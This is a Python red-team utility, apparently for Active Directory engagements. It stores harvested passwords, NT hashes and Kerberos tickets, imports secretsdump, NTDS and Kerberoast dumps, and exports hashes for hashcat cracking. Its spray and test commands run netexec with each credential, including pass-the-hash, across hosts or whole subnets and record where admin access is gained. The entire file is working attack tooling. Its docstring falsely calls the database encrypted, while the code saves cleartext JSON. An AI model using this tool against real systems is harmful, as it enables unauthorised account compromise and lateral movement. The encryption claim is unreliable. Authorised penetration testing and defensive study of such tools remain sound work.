#!/usr/bin/env python3
"""rta-credstore — Credential manager for AD engagements.

Tracks all discovered credentials (passwords, hashes, tickets) in a local
encrypted database. Tests credentials across hosts. Eliminates the
"which creds have I tried where?" problem.

Usage:
  rta-credstore add -u jsmith -p 'P@ssw0rd!' -d corp.local
  rta-credstore add -u admin -H aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 -d corp.local
  rta-credstore add -u svc_sql --ticket /tmp/svc_sql.ccache -d corp.local
  rta-credstore list
  rta-credstore list --domain corp.local
  rta-credstore spray --target 192.168.56.10 --proto smb
  rta-credstore spray --target 192.168.56.0/24 --proto smb --delay 30
  rta-credstore test -u jsmith -t 192.168.56.10 --proto winrm
  rta-credstore export --format hashcat
  rta-credstore import --file secretsdump-output.txt
"""

import argparse
import csv
import ipaddress
import json
import os
import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

DB_FILE = os.environ.get("RTA_CREDSTORE", os.path.expanduser("~/.rta-credstore.json"))


class CredStore:
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self.creds = []
        self.results = []  # spray/test results
        self.load()

    def load(self):
        if os.path.exists(self.db_path):
            with open(self.db_path) as f:
                data = json.load(f)
                self.creds = data.get("creds", [])
                self.results = data.get("results", [])

    def save(self):
        with open(self.db_path, "w") as f:
            json.dump({"creds": self.creds, "results": self.results}, f, indent=2)
        os.chmod(self.db_path, 0o600)

    def add_cred(self, username, domain="", password="", nthash="",
                 lmhash="", ticket="", source="manual", cred_type=""):
        if not cred_type:
            if password:
                cred_type = "password"
            elif nthash:
                cred_type = "hash"
            elif ticket:
                cred_type = "ticket"

        # Parse combined LM:NT hash format
        if nthash and ":" in nthash and not lmhash:
            parts = nthash.split(":")
            if len(parts) == 2 and len(parts[0]) == 32 and len(parts[1]) == 32:
                lmhash, nthash = parts

        # Deduplicate
        for c in self.creds:
            if (c["username"] == username and c["domain"] == domain and
                c.get("password") == password and c.get("nthash") == nthash):
                return False  # already exists

        entry = {
            "id": len(self.creds) + 1,
            "username": username,
            "domain": domain,
            "password": password,
            "nthash": nthash,
            "lmhash": lmhash,
            "ticket": ticket,
            "type": cred_type,
            "source": source,
            "added": datetime.now().isoformat(),
            "valid_on": [],   # hosts where this cred worked
            "failed_on": [],  # hosts where this cred failed
            "admin_on": [],   # hosts where this cred has admin
        }
        self.creds.append(entry)
        self.save()
        return True

    def list_creds(self, domain=None, cred_type=None):
        filtered = self.creds
        if domain:
            filtered = [c for c in filtered if c["domain"].lower() == domain.lower()]
        if cred_type:
            filtered = [c for c in filtered if c["type"] == cred_type]
        return filtered

    def import_secretsdump(self, filepath):
        """Import credentials from Impacket secretsdump output."""
        count = 0
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("["):
                    continue

                # Format: domain\user:RID:LM:NT:::
                m = re.match(
                    r"(?:(.+?)\\)?(.+?):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
                    line, re.IGNORECASE
                )
                if m:
                    domain, user, rid, lm, nt = m.groups()
                    if self.add_cred(user, domain or "", nthash=nt, lmhash=lm,
                                     source=f"secretsdump:{filepath}"):
                        count += 1
                    continue

                # Format: user:password (from cleartext dumps)
                m = re.match(r"(?:(.+?)\\)?(.+?):(.+)", line)
                if m:
                    domain, user, pw = m.groups()
                    if self.add_cred(user, domain or "", password=pw,
                                     source=f"import:{filepath}"):
                        count += 1

        self.save()
        return count

    def import_ntds(self, filepath):
        """Import from ntds.dit dump (same format as secretsdump)."""
        return self.import_secretsdump(filepath)

    def import_kerberoast(self, filepath):
        """Import Kerberoast hashes (hashcat -m 13100 format)."""
        count = 0
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                # $krb5tgs$23$*user$realm$spn*$...
                m = re.match(r"\$krb5tgs\$\d+\$\*(.+?)\$(.+?)\$", line)
                if m:
                    user, realm = m.groups()
                    if self.add_cred(user, realm, nthash=line,
                                     cred_type="kerberoast",
                                     source=f"kerberoast:{filepath}"):
                        count += 1
        self.save()
        return count

    def test_cred(self, cred_id, target, proto="smb"):
        """Test a specific credential against a target."""
        cred = None
        for c in self.creds:
            if c["id"] == cred_id:
                cred = c
                break
        if not cred:
            return None

        return self._test_single(cred, target, proto)

    def _test_single(self, cred, target, proto):
        """Test a single credential via nxc/netexec."""
        user = cred["username"]
        domain = cred["domain"]
        result = {"target": target, "proto": proto, "cred_id": cred["id"],
                  "user": user, "time": datetime.now().isoformat()}

        # Build nxc command
        cmd = ["netexec", proto, target]
        if domain:
            cmd += ["-d", domain]
        cmd += ["-u", user]

        if cred["password"]:
            cmd += ["-p", cred["password"]]
        elif cred["nthash"]:
            lm = cred.get("lmhash", "aad3b435b51404eeaad3b435b51404ee")
            cmd += ["-H", f"{lm}:{cred['nthash']}"]
        else:
            result["status"] = "skip"
            result["reason"] = "no password or hash"
            return result

        try:
            output = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            stdout = output.stdout

            if "[+]" in stdout and "(Pwn3d!)" in stdout:
                result["status"] = "admin"
                if target not in cred["admin_on"]:
                    cred["admin_on"].append(target)
                if target not in cred["valid_on"]:
                    cred["valid_on"].append(target)
            elif "[+]" in stdout:
                result["status"] = "valid"
                if target not in cred["valid_on"]:
                    cred["valid_on"].append(target)
            elif "STATUS_LOGON_FAILURE" in stdout or "[-]" in stdout:
                result["status"] = "failed"
                if target not in cred["failed_on"]:
                    cred["failed_on"].append(target)
            elif "STATUS_ACCOUNT_LOCKED_OUT" in stdout:
                result["status"] = "locked"
            else:
                result["status"] = "unknown"
                result["output"] = stdout[:200]

        except subprocess.TimeoutExpired:
            result["status"] = "timeout"
        except FileNotFoundError:
            result["status"] = "error"
            result["reason"] = "netexec not found"
        except Exception as e:
            result["status"] = "error"
            result["reason"] = str(e)

        self.results.append(result)
        self.save()
        return result

    def spray(self, target, proto="smb", delay=0):
        """Test all credentials against a target (or CIDR range)."""
        targets = []
        try:
            network = ipaddress.ip_network(target, strict=False)
            targets = [str(ip) for ip in network.hosts()]
        except ValueError:
            targets = [target]

        results = []
        for t in targets:
            for cred in self.creds:
                if cred["type"] in ("kerberoast", "ticket"):
                    continue  # skip non-auth creds
                if t in cred.get("valid_on", []) or t in cred.get("failed_on", []):
                    continue  # already tested

                r = self._test_single(cred, t, proto)
                results.append(r)
                status_icon = {"admin": "[!!!]", "valid": "[+]", "failed": "[-]",
                               "locked": "[LOCKED]", "timeout": "[T/O]"}.get(
                                   r["status"], "[?]")
                print(f"  {status_icon} {cred['domain']}\\{cred['username']} → {t} ({r['status']})")

                if r["status"] == "locked":
                    print(f"  [!] ACCOUNT LOCKED — stopping spray for {cred['username']}")
                    break

                if delay > 0:
                    time.sleep(delay)

        return results

    def export_hashcat(self):
        """Export NT hashes in hashcat format."""
        lines = []
        for c in self.creds:
            if c.get("nthash") and c["type"] == "hash":
                lines.append(f"{c.get('lmhash', 'aad3b435b51404eeaad3b435b51404ee')}:{c['nthash']}")
            elif c["type"] == "kerberoast":
                lines.append(c["nthash"])
        return "\n".join(lines)

    def export_csv(self):
        """Export all creds as CSV."""
        lines = ["id,domain,username,type,password,nthash,source,valid_on,admin_on"]
        for c in self.creds:
            valid = ";".join(c.get("valid_on", []))
            admin = ";".join(c.get("admin_on", []))
            pw = c.get("password", "").replace(",", "\\,")
            lines.append(f"{c['id']},{c['domain']},{c['username']},{c['type']},"
                         f"{pw},{c.get('nthash','')},{c['source']},{valid},{admin}")
        return "\n".join(lines)


def print_cred_table(creds):
    if not creds:
        print("  No credentials found.")
        return

    print(f"\n  {'ID':<4} {'Domain':<18} {'User':<20} {'Type':<12} "
          f"{'Secret':<32} {'Valid':<6} {'Admin':<6} {'Source'}")
    print("  " + "─" * 120)
    for c in creds:
        secret = ""
        if c.get("password"):
            secret = c["password"][:30]
        elif c.get("nthash") and c["type"] != "kerberoast":
            secret = c["nthash"][:30]
        elif c["type"] == "kerberoast":
            secret = "$krb5tgs$..."
        elif c.get("ticket"):
            secret = Path(c["ticket"]).name[:30]

        valid_count = len(c.get("valid_on", []))
        admin_count = len(c.get("admin_on", []))
        print(f"  {c['id']:<4} {c['domain']:<18} {c['username']:<20} {c['type']:<12} "
              f"{secret:<32} {valid_count:<6} {admin_count:<6} {c['source'][:20]}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="RTA Credential Store — manage AD engagement credentials",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = parser.add_subparsers(dest="command", help="Command")

    # add
    add_p = sub.add_parser("add", help="Add a credential")
    add_p.add_argument("-u", "--username", required=True)
    add_p.add_argument("-d", "--domain", default="")
    add_p.add_argument("-p", "--password", default="")
    add_p.add_argument("-H", "--hash", default="", help="NT hash or LM:NT")
    add_p.add_argument("--ticket", default="", help="Kerberos ticket (.ccache/.kirbi)")
    add_p.add_argument("--source", default="manual")

    # list
    list_p = sub.add_parser("list", help="List credentials")
    list_p.add_argument("--domain", default=None)
    list_p.add_argument("--type", default=None, choices=["password", "hash", "ticket", "kerberoast"])

    # test
    test_p = sub.add_parser("test", help="Test a credential")
    test_p.add_argument("-i", "--id", type=int, help="Credential ID")
    test_p.add_argument("-u", "--username", help="Or specify by username")
    test_p.add_argument("-t", "--target", required=True)
    test_p.add_argument("--proto", default="smb", choices=["smb", "winrm", "ldap", "mssql", "rdp", "ssh"])

    # spray
    spray_p = sub.add_parser("spray", help="Test all creds against target(s)")
    spray_p.add_argument("--target", required=True, help="IP or CIDR")
    spray_p.add_argument("--proto", default="smb")
    spray_p.add_argument("--delay", type=int, default=0, help="Delay between attempts (seconds)")

    # import
    imp_p = sub.add_parser("import", help="Import credentials from file")
    imp_p.add_argument("--file", required=True)
    imp_p.add_argument("--format", default="auto",
                       choices=["auto", "secretsdump", "ntds", "kerberoast"])

    # export
    exp_p = sub.add_parser("export", help="Export credentials")
    exp_p.add_argument("--format", default="csv", choices=["csv", "hashcat", "json"])
    exp_p.add_argument("-o", "--output", default="-", help="Output file (- for stdout)")

    # summary
    sub.add_parser("summary", help="Show engagement summary")

    args = parser.parse_args()
    store = CredStore()

    if args.command == "add":
        added = store.add_cred(
            args.username, args.domain, args.password,
            nthash=args.hash, ticket=args.ticket, source=args.source,
        )
        if added:
            print(f"  [+] Added: {args.domain}\\{args.username}")
        else:
            print(f"  [~] Already exists: {args.domain}\\{args.username}")

    elif args.command == "list":
        creds = store.list_creds(args.domain, args.type)
        print_cred_table(creds)

    elif args.command == "test":
        cred_id = args.id
        if not cred_id and args.username:
            for c in store.creds:
                if c["username"] == args.username:
                    cred_id = c["id"]
                    break
        if not cred_id:
            print("  [-] Specify --id or --username")
            sys.exit(1)
        result = store.test_cred(cred_id, args.target, args.proto)
        if result:
            icon = {"admin": "[!!!] ADMIN", "valid": "[+] VALID",
                    "failed": "[-] FAILED"}.get(result["status"], f"[?] {result['status']}")
            print(f"  {icon}: {result['user']} → {result['target']}")

    elif args.command == "spray":
        print(f"\n  [*] Spraying {args.target} via {args.proto}")
        print(f"  [*] {len(store.creds)} credentials loaded\n")
        results = store.spray(args.target, args.proto, args.delay)
        admin = sum(1 for r in results if r["status"] == "admin")
        valid = sum(1 for r in results if r["status"] == "valid")
        failed = sum(1 for r in results if r["status"] == "failed")
        print(f"\n  [*] Results: {admin} admin, {valid} valid, {failed} failed")

    elif args.command == "import":
        fmt = args.format
        if fmt == "auto":
            with open(args.file) as f:
                first_line = f.readline()
            if "$krb5tgs$" in first_line:
                fmt = "kerberoast"
            else:
                fmt = "secretsdump"

        if fmt in ("secretsdump", "ntds"):
            count = store.import_secretsdump(args.file)
        elif fmt == "kerberoast":
            count = store.import_kerberoast(args.file)
        else:
            count = store.import_secretsdump(args.file)
        print(f"  [+] Imported {count} credentials from {args.file}")

    elif args.command == "export":
        if args.format == "hashcat":
            output = store.export_hashcat()
        elif args.format == "csv":
            output = store.export_csv()
        else:
            output = json.dumps(store.creds, indent=2)

        if args.output == "-":
            print(output)
        else:
            with open(args.output, "w") as f:
                f.write(output)
            print(f"  [+] Exported to {args.output}")

    elif args.command == "summary":
        total = len(store.creds)
        by_type = {}
        all_valid = set()
        all_admin = set()
        for c in store.creds:
            by_type[c["type"]] = by_type.get(c["type"], 0) + 1
            all_valid.update(c.get("valid_on", []))
            all_admin.update(c.get("admin_on", []))

        print(f"\n  Credentials: {total}")
        for t, n in sorted(by_type.items()):
            print(f"    {t}: {n}")
        print(f"  Hosts with valid auth: {len(all_valid)}")
        print(f"  Hosts with admin: {len(all_admin)}")
        if all_admin:
            print(f"  Admin hosts: {', '.join(sorted(all_admin))}")
        print()

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
